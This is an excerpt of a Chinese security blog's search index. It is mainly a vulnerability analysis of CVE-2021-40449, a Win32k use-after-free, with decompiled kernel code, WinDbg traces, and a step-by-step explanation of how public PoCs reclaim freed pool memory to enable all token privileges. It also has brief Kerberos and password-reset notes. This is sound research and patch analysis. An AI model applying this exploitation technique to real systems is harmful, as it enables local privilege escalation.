Key)用于Client和TGS通信，通过用户密钥加密 B：TGT（包含Client/TGS会话密钥、用户、用户网络地址、TGT有效期），通过TGS密钥加密 Client收到消息AB，用自己的用户密钥解密消息A得到和TGS通信的密钥TGS会话密钥 Client向TGS请求服务，发送两条消息 C：消息B和申请的服务ID（明文） D：认证符（包括用户ID、时间戳）通过(Client/TGS Session Key)加密 TGS拿到服务ID检查是否有该服务，如果有该服务则用TGS密钥解密消息B得到(Client/TGS Session Key)再用TGS会话密钥解密消息D得到用户ID、时间戳，与TGT内的用户ID和时间戳比对验证有效性。 通过之后TGS返回两条消息给Client E：ST（SS会话密钥、用户ID、用户网络地址、有效期）通过SS密钥加密 F：SS会话密钥，通过TGS会话密钥加密 Client通过TGS会话密钥解密消息F得到SS会话密钥 Client给SS发送两条消息 G：即消息E H：认证符，包含用户ID，时间戳，通过SS会话密钥加密 SS收到两条消息之后用SS密钥解密消息G（E）得到SS会话密钥，在通过会话密钥解密消息H得到用户ID、时间戳等信息，如果和消息G（E）内的时间戳和用户ID比对，通过则返回消息给Client I：消息H内的时间戳，通过SS会话密钥加密 Client收到消息之后用SS会话密钥解密得到时间戳，并验证，通过则可以向SS发送请求。 "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"在Windows server 2019上重置密码","tags":[],"description":"","content":"重置windows server 2019的administrator密码 之前在Vmware上的Windows server 2019的Administrator密码忘记了，使用网上的方法时找不到用PE启动系统的办法，无奈只能使用其他办法。写此文记录一下。\n设置CD/DVD 首先在虚拟机-设置的硬件选项卡下面的CD/DVD设置为使用ISO映像文件并找到windows server 2019镜像位置，如下图\n之后选择虚拟机-电源-开机时打开固件启动虚拟机，虚拟机就会进入BIOS，在BIOS里选择CD/DVD启动，即会进入下图。\n参考链接\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/","title":"CVE-2021-40449 Win32k 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。\n基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。\n内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：\n在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。\n句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。\n句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDC：是一个内核对象，全称device context，设备上下文对象\nHDC：DC对象的句柄。\n释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。\neg：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-\u0026gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(\u0026#34;第二次调用\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } 漏洞形成分析 该漏洞产生于win32kfull!GreResetDCInternal函数中，该函数内会获取DC对象内的函数指针，并执行该函数指针指向的函数，但并未检查DC对象是否异常。所以如果可以在调用函数指针之前释放DC对象，并重新申请该对象的内存空间，通过构造内存布局，修改原DC对象的函数指针指向其他任意内核函数，就可以在win32kfull!GreResetDCInternal内实现任意内核函数调用。\n根据代码，我们可以算出DCO对象和DC对象的函数指针的关系：function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // 利用构造函数从HDC创建DCOBJ对象 v8 = v25; ·········· v10 = *(_QWORD *)(v8 + 48);\t// 赋值 *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; ······· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; ······· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄 if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值 ······· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······ bDeleteDCInternal(v6, 1i64, 0i64); // 传入了hdcOpenDCW返回的HDC，但HmgSwapLockedHandleContents交换了新旧句柄对应的DC对象，此时v6句柄对应旧DC对象。 ······ 调用该函数指针的时候，所用的两个参数也是源于用户传入的HDC句柄对应的DC对象。\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\n在win32kfull!GreResetDCInternal函数的后半段会调用win32kbase!DeleteDCInternal函数释放传入该函数的HDC句柄所对应的DC对象，到这里就达成了use-after-free的free步骤。\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······· // 删除HDC句柄对应的DC对象。 bDeleteDCInternal(v6, 1i64, 0i64); 如果在释放DC对象之后，重新申请DC对象空间，修改里面的函数指针内容，并通过某些步骤，让内核执行DC对象内的函数指针，即可达到use步骤让内核执行任意内核函数。\n漏洞利用分析 POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOC代码分析：\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\n要利用该漏洞，难点在于free DC对象之后怎么使得内核再次调用DC对象的函数指针，在正常GreResetDCInternal函数流程中，是先调用DC对象的函数指针再删除这个对象，即按照正常流程即不会有use-after-free的条件。\n在ring 3层调用ResetDC函数会通过系统调用进入内核调用函数NtGdiResetDC，在NtGdiResetDC会调用漏洞函数GreResetDCInternal，在GreResetDCInternal中会调用DC对象里面的函数指针。要利用该漏洞即要在调用函数指针之前完成三步动作：1、释放DC对象2、重新申请原DC对象的内存空间3、完成内存空间的布局。\n在函数GreResetDCInternal调用DC对象的函数指针之前会调用win32kbase!hdcOpenDCW函数。win32kbase!hdcOpenDCW函数会执行打印机驱动的用户态回调函数表里面的函数，该表里面存放了函数指针，该函数指针原先指向的是预定义的回调函数。在POC中覆盖这个函数指针，使其执行POC定义的回调函数。\n在自定义回调函数中再次执行ResetDC函数并传入同一HDC句柄，则会再次执行NtGdiResetDC和GreResetDCInternal函数，而在GreResetDCInternal的后半段，会释放传入的HDC对应的DC对象并创建新的DC对象。此时达到了free步骤。\n在第二次ResetDC调用完成后，原DC对象已被释放，此时可以重新申请原DC对象的内存空间并完成内存布局，将原DC对象的函数指针和函数指针的参数的位置设置为想要执行的内核函数的地址及参数。在执行完第一次回调之后，GreResetDCInternal 将调用原DC对象内的函数指针，即完成了任意内核函数调用，此时达到了use步骤。\n完整调用链如下图：\n其中漏洞相关的类定义如下，参考https://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDC链表指针 HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; 类之间的关系可以简化为下图：\n调试 free部分 在free部分需要把我们想要释放的内存空间释放，并让后面的use部分成功申请到这块内存空间。\n调试环境：虚拟机windows 10 1607、物理机windows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\n断点:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;调用GreResetDCInternal函数\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;调用DCOBJ构造函数\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;调用_imp_hdcOpenDCW函数\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;第二次DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;调用DC对象函数指针\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;调用HmgSwapLockedHandle函数\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;调用_imp_bDeleteDCInternal函数\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;循环调用\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;调用win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; 运行POC，断点bp win32kfull!NtGdiResetDC触发此时传入的句柄为rcx=00000000092105f1\n第一次调用win32kfull!GreResetDCInternal 时传入各个参数为rcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 即第一个句柄值为00000000092105f1\n第一次调用构造函数，利用DC对象创建DCO对象，此时rbx存放DCO对象的地址，\n根据漏洞形成分析的计算公式，可以很方便的得到DC对象内的函数指针指向的函数的地址为：ffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbx存放了构造函数产生的DCO对象地址 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010为rbx的值，此处ffffd50e`041fd010+0x30为PDC的地址，PDC指向DC对象即DC对象地址为ffffd50e`00052030 // 计算公式 *(dco地址+0x30)=dc地址 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0处为DC对象的函数指针，该指针指向了一个函数 // 计算公式 *(dc地址 +0xad0)=函数地址 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // 以下为函数的汇编 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx 之后通过hdcOpenDCW函数调用用户模式的回调函数，在回调函数中再次调用ResetDC函数，此时传入的HDC和第一次调用ResetDC的是同一个句柄。\n第二次调用win32kfull!GreResetDCInternal 时，传入同一个HDC句柄，即对应同一个DC对象。\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 第二次调用DCOBJ构造函数时，由于传入的是同一个HDC句柄，所以HDC句柄引用次数+1，同时两次调用构造函数构造的对象关联到同一个DC对象。\n之后第二次调用win32kfull!_imp_hdcOpenDCW函数，在该函数内执行政策回调函数，win32kfull!imp_hdcOpenDCW返回一个HDC句柄值为0000000003210041，即创建了一个新的DC对象。之后通过新创建的DC对象创建DCO对象。\n在win32kfull!GreResetDCInternal后半段会调用win32kfull!_imp_HmgSwapLockedHandleContents交换第一个HDC句柄和第二次调用win32kfull!imp_hdcOpenDCW创建的HDC句柄。\n调用win32kfull!_imp_HmgSwapLockedHandleContents之后两个句柄对应的DC内容为已经发生了交换\n// 以下内容为旧DC对象，但是句柄为新句柄 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // 以下内容为新DC对象，但句柄为旧句柄 ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... 之后调用win32kfull!_imp_bDeleteDCInternal传入HDC句柄，该函数会释放HDC句柄对应的DC对象，而此时传入该函数的HDC句柄为第二次调用hdcOpenDCW函数返回的句柄，但之前交换过新旧句柄，所以实际上释放的是旧HDC句柄对应的DC对象。\n之前计算函数指针的时候，我们知道DCO +0x30是指向DC对象的指针，所以在调用win32kfull!_imp_bDeleteDCInternal函数之后，原DC对象的内存空间已经被释放，达成了use-after-free的第一步free。\nfunction pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // 取DC对象地址 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DC对象的内存已被释放，大小为e30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu 之后只需要申请这块内存空间并构造，刚删除的时候，虽然DC对象已经被释放，但函数指针还是指向正确的函数地址，接下来就要申请空间，覆盖这块内存空间的函数指针的值即可。\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// 取DC对象地址 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// 取DC对象内的函数指针 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use 部分 注：此部分为第二次调试，所以句柄、内存地址和前部分不一样。\n在poc里面会调用CreatePalette函数，该此函数会申请内核堆，\n第一个句柄rcx=0000000015213372\n// 第一个DCO对象 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // 第一个PDC 指向DC对象 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // 第一个DC对象 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 第二个句柄rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放\n0: kd\u0026gt; !pool ffff885e`80063030 // 注意，此时DC对象地址距离堆头地址为0x30大小 Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm 根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPool代码如下，最终是通过调用ExAllocatePoolWithTag申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } 同时在Poc代码分析里面分析了DC对象函数指针和堆头之间的位置关系，所以通过构造传入CreatePalette的LOGPALETTE结构可以刚刚好覆盖原DC对象内的函数指针以及该函数指针要调用的参数，内存分布具体见https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp 里面的注释。\n通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // 此处为RtlBitMap地址 ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位 ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c 调用DC里面的函数指针之前，自身权限位为正常权限。\n调用函数指针之后，可以看到权限位全部置为了1\n补丁分析 在漏洞利用分析里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。\n我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。\n所以判断DC对象异常可以通过判断DC对象的引用次数实现。\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // 利用构造函数从HDC创建DCOBJ对象 v8 = v25; ·········· v10 = *(_QWORD *)(v8 + 48);\t// 赋值 *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; ······· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; ······· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄 if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值 ······· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······ bDeleteDCInternal(v6, 1i64, 0i64); // 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC ······ 